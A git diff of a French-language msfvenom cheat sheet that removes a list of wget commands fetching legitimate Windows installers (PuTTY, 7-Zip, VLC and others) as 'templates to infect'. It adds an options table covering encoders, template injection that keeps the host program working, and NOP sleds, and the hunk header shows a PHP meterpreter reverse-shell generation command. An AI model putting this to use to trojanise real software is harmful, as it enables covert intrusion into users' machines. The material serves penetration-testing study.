@@ -242,33 +242,27 @@ msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.101 lport=7000 -f raw >
 
 <img width="1392" height="733" alt="image" src="https://github.com/user-attachments/assets/8f901a2e-b4c9-4794-b8e1-8bd1ea27088a" />
 
-### Templates Windows (à infecter)
 
-```bash
-# 1. Putty 64-bit (LE PLUS LÉGER - RECOMMANDÉ)
-wget -4 -O /root/putty.exe "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe"
+---
 
-# 2. Putty 32-bit (pour Shellter)
-wget -4 -O /root/putty32.exe "https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe"
+## TABLEAU COMPLET DES COMMANDES MSFVENOM
 
-# 3. Notepad++ (léger)
-wget -4 -O /root/npp.exe "https://github.com/notepad-plus-plus/notepad-plus-plus/releases/download/v8.5.4/npp.8.5.4.Installer.exe"
+### LÉGENDE DES OPTIONS
 
-# 4. 7-Zip (léger)
-wget -4 -O /root/7z.exe "https://www.7-zip.org/a/7z2201.exe"
-
-# 5. Chrome (lourd ~20MB)
-wget -4 -O /root/ChromeSetup.exe "https://dl.google.com/chrome/install/latest/chrome_installer.exe"
-
-# 6. Firefox (lourd ~30MB)
-wget -4 -O /root/FirefoxInstaller.exe "https://download.mozilla.org/?product=firefox-latest-ssl&os=win64&lang=fr"
-
-# 7. VLC (moyen)
-wget -4 -O /root/vlc.exe "https://get.videolan.org/vlc/3.0.18/win64/vlc-3.0.18-win64.exe"
-
-# 8. SumatraPDF (léger)
-wget -4 -O /root/sumatra.exe "https://www.sumatrapdfreader.org/dl/SumatraPDF-3.4.6-64-install.exe"
-```
+| Option | Signification | Exemple |
+|--------|---------------|---------|
+| `-p` | Payload à utiliser | `-p windows/x64/meterpreter_reverse_tcp` |
+| `-f` | Format de sortie | `-f exe`, `-f raw`, `-f python`, `-f csharp` |
+| `-e` | Encodeur à utiliser | `-e x86/shikata_ga_nai` |
+| `-i` | Nombre d'itérations | `-i 10` (10 passes d'encodage) |
+| `-x` | Template (fichier à infecter) | `-x /root/putty.exe` |
+| `-k` | Garde le comportement du template | `-k` (le template s'exécute normalement) |
+| `-b` | Caractères à éviter | `-b "\x00\xff"` |
+| `-o` | Fichier de sortie (CHEMIN) | `-o /home/kali/Desktop/payload.exe` |
+| `--platform` | Plateforme cible | `--platform windows` |
+| `-a` | Architecture | `-a x64` |
+| `--smallest` | Génère le plus petit possible | `--smallest` |
+| `-n` | Ajoute des NOP sled | `-n 32` (32 NOPs) |
 
 ---
 
